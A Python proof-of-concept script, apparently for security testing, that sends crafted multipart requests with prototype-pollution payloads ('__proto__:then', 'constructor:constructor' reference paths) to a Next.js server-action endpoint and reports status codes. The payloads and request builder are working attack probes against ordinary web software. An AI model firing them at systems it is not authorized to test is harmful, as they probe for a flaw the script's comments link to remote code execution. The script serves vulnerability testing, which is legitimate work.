#!/usr/bin/env python3
"""
Next.js RSC Flight Protocol - Prototype Pollution Security Test POC

This script tests for potential prototype pollution vulnerabilities
in the RSC Flight protocol's reference path parsing.

DISCLAIMER: This is for security research purposes only.
Only test against your own applications with proper authorization.
"""

import requests
import sys

def create_multipart_payload(payload_json: str, boundary: str = "----WebKitFormBoundarySecurity") -> bytes:
    """Create a multipart/form-data payload for testing"""
    body = f"""--{boundary}\r
Content-Disposition: form-data; name="0"\r
\r
{payload_json}\r
--{boundary}\r
Content-Disposition: form-data; name="1"\r
\r
"$@0"\r
--{boundary}--"""
    return body.encode('utf-8')


def test_prototype_pollution(url: str) -> dict:
    """
    Test for prototype pollution vulnerability using __proto__ path
    
    This test sends a crafted payload that attempts to access __proto__
    through the RSC Flight protocol's reference path mechanism.
    """
    results = {
        "vulnerable": None,
        "test_name": "Prototype Pollution via __proto__ path",
        "details": []
    }
    
    # Test payload 1: Basic __proto__ access
    payload1 = '{"then":"$1:__proto__:then"}'
    
    headers = {
        "User-Agent": "SecurityTest/1.0",
        "Next-Action": "test_action_id",  # Arbitrary action ID to trigger server action handling
        "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundarySecurity",
    }
    
    body = create_multipart_payload(payload1)
    
    try:
        response = requests.post(url, headers=headers, data=body, timeout=10)
        results["details"].append({
            "payload": payload1,
            "status_code": response.status_code,
            "response_length": len(response.content),
            "headers": dict(response.headers)
        })
        
        # Check response for signs of successful exploitation
        if response.status_code == 500:
            results["details"].append({
                "note": "Server returned 500 - might indicate error during prototype access"
            })
        
    except requests.exceptions.RequestException as e:
        results["details"].append({"error": str(e)})
    
    return results


def test_constructor_pollution(url: str) -> dict:
    """
    Test for constructor.constructor access which could lead to RCE
    """
    results = {
        "vulnerable": None,
        "test_name": "Constructor Chain Access",
        "details": []
    }
    
    # Test payload: constructor.constructor access
    payload = '{"get":"$1:constructor:constructor"}'
    
    headers = {
        "User-Agent": "SecurityTest/1.0",
        "Next-Action": "test_action_id",
        "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundarySecurity",
    }
    
    body = create_multipart_payload(payload)
    
    try:
        response = requests.post(url, headers=headers, data=body, timeout=10)
        results["details"].append({
            "payload": payload,
            "status_code": response.status_code,
            "response_length": len(response.content),
        })
    except requests.exceptions.RequestException as e:
        results["details"].append({"error": str(e)})
    
    return results


def test_thenable_bypass(url: str) -> dict:
    """
    Test for thenable object creation bypass
    
    This tests if the 'then' property filtering can be bypassed
    """
    results = {
        "vulnerable": None,
        "test_name": "Thenable Object Bypass",
        "details": []
    }
    
    # Test payload: Nested thenable with function-like structure
    payloads = [
        '{"then":"$1:__proto__:then","status":"resolved_model"}',
        '{"then":"$1:constructor:prototype:then"}',
        '{"valueOf":"$1:__proto__:valueOf"}',
    ]
    
    headers = {
        "User-Agent": "SecurityTest/1.0",
        "Next-Action": "test_action_id",
        "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundarySecurity",
    }
    
    for payload in payloads:
        body = create_multipart_payload(payload)
        
        try:
            response = requests.post(url, headers=headers, data=body, timeout=10)
            results["details"].append({
                "payload": payload,
                "status_code": response.status_code,
                "response_length": len(response.content),
            })
        except requests.exceptions.RequestException as e:
            results["details"].append({"payload": payload, "error": str(e)})
    
    return results


def run_all_tests(url: str) -> None:
    """Run all security tests against the target URL"""
    print(f"\n{'='*60}")
    print(f"Next.js RSC Prototype Pollution Security Test")
    print(f"Target: {url}")
    print(f"{'='*60}\n")
    
    tests = [
        test_prototype_pollution,
        test_constructor_pollution,
        test_thenable_bypass,
    ]
    
    for test_func in tests:
        print(f"\n[*] Running: {test_func.__name__}")
        print("-" * 40)
        
        try:
            results = test_func(url)
            print(f"Test: {results['test_name']}")
            
            for detail in results.get("details", []):
                if "error" in detail:
                    print(f"  [ERROR] {detail['error']}")
                else:
                    print(f"  Payload: {detail.get('payload', 'N/A')[:50]}...")
                    print(f"  Status: {detail.get('status_code', 'N/A')}")
                    if detail.get('note'):
                        print(f"  Note: {detail['note']}")
        except Exception as e:
            print(f"  [EXCEPTION] {e}")
    
    print(f"\n{'='*60}")
    print("Test Complete")
    print(f"{'='*60}\n")


def main():
    if len(sys.argv) < 2:
        print("Usage: python prototype-pollution-test.py <target_url>")
        print("Example: python prototype-pollution-test.py http://localhost:3000")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Ensure URL ends without trailing slash
    target_url = target_url.rstrip('/')
    
    run_all_tests(target_url)


if __name__ == "__main__":
    main()
